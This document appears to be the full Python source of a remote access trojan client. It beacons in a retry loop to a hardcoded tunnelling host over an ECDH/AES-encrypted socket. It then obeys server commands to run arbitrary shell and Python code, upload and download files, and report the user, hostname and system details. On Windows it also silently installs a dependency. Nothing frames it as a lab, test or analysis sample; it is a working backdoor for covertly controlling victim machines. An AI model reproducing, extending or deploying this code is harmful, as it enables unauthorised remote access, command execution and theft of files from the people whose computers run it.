import time
import json
from io import StringIO
import platform
import subprocess
import sys
import traceback
import os
import socket
import logging
from typing import Tuple, Union
if platform.system().startswith("Windows"):
    try:
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives import padding
        from cryptography.hazmat.primitives.asymmetric import ec
        from cryptography.hazmat.primitives.kdf.hkdf import HKDF
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    except:
        os.system("python -m pip install cryptography -q -q -q")
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives import padding
        from cryptography.hazmat.primitives.asymmetric import ec
        from cryptography.hazmat.primitives.kdf.hkdf import HKDF
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

if getattr(sys, 'frozen', False):
    CLIENT_PATH = os.path.dirname(sys.executable)
elif __file__:
    CLIENT_PATH = os.path.dirname(os.path.abspath(__file__))
os.chdir(CLIENT_PATH)
LOG = os.path.join(CLIENT_PATH, 'log.log')

if platform.system() == 'Windows':
    import ctypes

def errors(error: Exception, line: bool = True) -> str:
    """ Error Handler """
    error_class = error.__class__.__name__
    error_msg = f'{error_class}:'
    try:
        error_msg += f' {error.args[0]}'
    except (IndexError, AttributeError):
        pass
    if line:
        try:
            _, _, traceb = sys.exc_info()
            line_number = traceback.extract_tb(traceb)[-1][1]
            error_msg += f' (line {line_number})'
        except Exception:
            pass
    return error_msg
class ESocket:
    """
    Encrypted Socket

    Perform ECDH with the peer, agreeing on a session key, which is then used for AES256 encryption

    Header has a set size (default: 16 bytes) and consists of 3 data points
    The first byte determines if the packet is multipacket (is split into multiple packets)
    The second byte determines if the data is an error
    The rest of the header is used to set the size of the incoming data
    """

    # Byte length of the complete header
    header_length = 16
    # Byte length of the size header
    size_header_length = header_length - 2

    # AES encryption
    encryptor = None
    decryptor = None

    # Padding for AES encryption
    _pad = padding.PKCS7(256)

    def __init__(self, sock: socket.socket, server: bool = False) -> None:
        """ Define variables """
        self.sock = sock
        self.server = server

        self.handshake()

    def close(self):
        """ Close socket """
        self.sock.shutdown(socket.SHUT_RDWR)
        self.sock.close()

    def encrypt(self, data: bytes) -> bytes:
        """ Encrypt data """
        padder = self._pad.padder()
        data = padder.update(data) + padder.finalize()

        encryptor = self._cipher.encryptor()
        data = encryptor.update(data) + encryptor.finalize()

        return data

    def decrypt(self, data: bytes) -> bytes:
        """ Decrypt data """

        decryptor = self._cipher.decryptor()
        data = decryptor.update(data) + decryptor.finalize()

        unpadder = self._pad.unpadder()
        data = unpadder.update(data) + unpadder.finalize()

        return data

    def handshake(self) -> bool:
        """
        Handshake with Client

        Uses ECDH to agree on a session key
        Session key is used for AES256 encryption
        """

        # Use ECDH to derive a key for fernet encryption

        private_key = ec.generate_private_key(ec.SECP521R1())

        serialized_public_key = private_key.public_key().public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        # Exchange public keys
        logging.debug('retrieving peer public key')
        if self.server:
            self._send(serialized_public_key)
            _, serialized_peer_public_key = self._recv()
        else:
            _, serialized_peer_public_key = self._recv()
            self._send(serialized_public_key)

        peer_public_key = serialization.load_pem_public_key(serialized_peer_public_key)

        shared_key = private_key.exchange(ec.ECDH(), peer_public_key)

        # Perform key derivation.

        derived_key = HKDF(
            algorithm=hashes.SHA512(),
            length=32,
            salt=None,
            info=None
        ).derive(shared_key)

        logging.debug('agreeing on iv with peer')
        if self.server:
            iv = os.urandom(16)
            self._send(iv)
        else:
            _, iv = self._recv()

        self._cipher = Cipher(algorithms.AES(derived_key), modes.CBC(iv))

        return True

    def make_header(self, data: bytes, error: str) -> Tuple[bytes, Union[bytes, None]]:
        """ Make header for data """

        if len(error) > 1:
            raise

        split = 0
        extra_data = None
        packet_data = data

        max_data_size = int('9' * self.size_header_length)

        if len(data) > max_data_size:
            split = 1
            packet_data = data[:max_data_size]
            extra_data = data[max_data_size + 1:]

        size_header = f'{len(packet_data)}'

        if len(size_header) < self.size_header_length:
            # Pad extra zeros to size header
            size_header = '0' * (self.size_header_length - len(size_header)) + size_header

        packet = f'{split}{error}{size_header}'.encode() + packet_data

        return packet, extra_data

    def parse_header(self, header: bytes) -> Tuple[bool, str, int]:
        """ Parse esocket header """

        multipacket = bool(int(chr(header[0])))
        error = chr(header[1])
        size_header = int(header[2:])

        return multipacket, error, size_header

    def _recv(self) -> Tuple[str, bytes]:
        """ Receive data from client """

        def recvall(amount: int) -> bytes:
            """ Receive x amount of bytes """
            data = b''
            while len(data) < amount:
                buffer = self.sock.recv(amount - len(data))
                if not buffer:
                    return
                data += buffer
            return data

        header = recvall(self.header_length)
        multipacket, error, size_header = self.parse_header(header)
        logging.debug(f'parsed header: {multipacket}/{error}/{size_header}')

        data = recvall(size_header)
        logging.debug('got packet')

        if multipacket:
            _, next_data = self._recv()
            return error, data + next_data

        return error, data

    def postrecv(self, data: bytes) -> bytes:
        """ Post-receive decryption """
        return self.decrypt(data)

    def recv(self) -> Tuple[str, bytes]:
        """ Receive data from client """
        error, data = self._recv()
        return error, self.postrecv(data)

    def _send(self, data: bytes, error: str = '0') -> None:
        """ Send data to client """

        packet, extra_data = self.make_header(data, error)

        self.sock.sendall(packet)
        logging.debug('sent packet')
        if extra_data:
            self._send(extra_data)

    def presend(self, data: bytes) -> bytes:
        """ Pre-send encryption """
        # Pad data
        return self.encrypt(data)

    def send(self, data: bytes, error: str = '0') -> None:
        """ Send data to client """
        self._send(self.presend(data), error)


def pyshell(command: str) -> Tuple[str, str]:
    """ exec python commands """
    old_stdout = sys.stdout
    redirected_output = sys.stdout = StringIO()
    error = None
    try:
        exec(command)
    except Exception as err:
        print()
    finally:
        sys.stdout = old_stdout

    return redirected_output.getvalue(), error
class Client(object):
    esock = None
    sock = socket.socket()

    def __init__(self) -> None:

        if platform.system() == 'Windows':
            self._pwd = ' && cd'
        else:
            self._pwd = ' && pwd'

    def connect(self, address) -> None:
        try:
            self.sock.connect(address)
        except (ConnectionRefusedError, TimeoutError):
            raise
        except OSError as error:
            logging.error('%s: Attempting reconnect' % str(error))
            self.sock.close()
            self.sock = socket.socket()
            raise
        except Exception as error:
            logging.error(errors(error))
            raise
        logging.info('Connected to server: %s' % (str(address)))
        self.esock = ESocket(self.sock)
        try:
            self.esock.send(socket.gethostname().encode())
        except socket.error as error:
            logging.error(errors(error))
        self.address = address
    def send_json(self, data: not bytes) -> None:
        """ Send JSON data to Server """
        self.esock.send(json.dumps(data).encode())

    def send_file(self, file_to_transfer: str, block_size: int = 32768) -> None:
        try:
            with open(file_to_transfer, 'rb') as file:
                while True:
                    block = file.read(block_size)
                    if not block:
                        break
                    self.esock.send(block)
        except (FileNotFoundError, PermissionError) as error:
            self.esock.send(errors(error).encode(), '1')
            logging.error('Error transferring %s to Server: %s' % (file_to_transfer, errors(error)))
        else:
            self.esock.send(b'FILE_TRANSFER_DONE', '9')
            logging.info('Transferred %s to Server', file_to_transfer)
    def receive_file(self, save_as: str) -> None:
        try:
            with open(save_as, 'wb') as file:
                self.esock.send(b'Successfully opened file.')
                while True:
                    _, data = self.esock.recv()
                    if data == b'FILE_TRANSFER_DONE':
                        break
                    file.write(data)
        except (FileNotFoundError, PermissionError) as error:
            self.esock.send(errors(error).encode(), error='1')
            logging.error('Error receiving %s from Server: %s' % (save_as, errors(error)))
        else:
            logging.info('Transferred %s to Client', save_as)
    def receive_commands(self) -> None:
        while True:
            error, msg = self.esock.recv()
            data = json.loads(msg.decode())
            if data[0] == 'GETCWD':
                self.esock.send(os.getcwdb())
                continue
            if data[0] == 'LIST':
                continue
            if data[0] == 'PLATFORM':
                self.esock.send(platform.system().encode())
                continue
            if data[0] == 'LOG_FILE':
                self.esock.send(LOG.encode())
                continue
            if data[0] == '_INFO':
                self.send_json([platform.system(), os.path.expanduser('~'), os.getlogin()])
                continue
            if data[0] == 'FROZEN':
                self.send_json(getattr(sys, 'frozen', False))
                continue
            if data[0] == 'EXEC':
                output, error = pyshell.pyshell(data[1])
                self.send_json([output, error])
                continue
            if data[0] == 'RESTART_SESSION':
                self.send_json(True)
                logging.info('Restarting session')
                break
            if data[0] == 'CLOSE':
                try:
                    self.send_json(True)
                    logging.info('Closing connection and exiting')
                    self.esock.close()
                except Exception:
                    pass
                sys.exit(0)
            if data[0] == 'RECEIVE_FILE':
                self.send_file(data[1])
                continue
            if data[0] == 'SEND_FILE':
                self.receive_file(data[1])
                continue
            if data[0] == 'INFO':
                self.esock.send(f'User: {os.getlogin()}\n' \
                    f'OS: {platform.system()} {platform.release()} ' \
                    f'({platform.platform()}) ({platform.machine()})\n' \
                    f'Frozen (.exe): {getattr(sys, "frozen", False)}\n'.encode())
                continue
            if data[0] == 'SHELL':

                execute = lambda command: subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                split_command = data[1].split(' ')[0].strip().lower()

                if split_command in ['cd', 'chdir']:
                    process = execute(data[1] + self._pwd)
                    error = process.stderr.read().decode()
                    if error:
                        self.send_json(['ERROR', error])
                        continue
                    output = process.stdout.read().decode()
                    # Command should only return one line (cwd)
                    if output.count('\n') > 1:
                        self.send_json(['ERROR', output])
                        continue
                    os.chdir(output.strip())
                    self.send_json([os.getcwd()])
                    continue

                process = execute(data[1])
                for line in iter(process.stdout.readline, ''):
                    if line == b'':
                        break
                    self.esock.send(line.replace(b'\n', b''))
                    if self.esock.recv()[1] == b'QUIT':

                        break
                self.esock.send(process.stderr.read())
                self.esock.recv()
                self.esock.send(b'DONE', '1')
                continue
def main(address: tuple, retry_timer: int = 10) -> None:
    client = Client()
    logging.info('Starting connection loop')
    while True:
        try:
            client.connect(address)
        except Exception as error:
            print(error)
            time.sleep(retry_timer)
        else:
            break
    try:
        client.receive_commands()
    except Exception as error:
        logging.critical(errors(error))
def runme():
    while True:
        main(('lustingwound-47970.portmap.io', 47970))
runme()
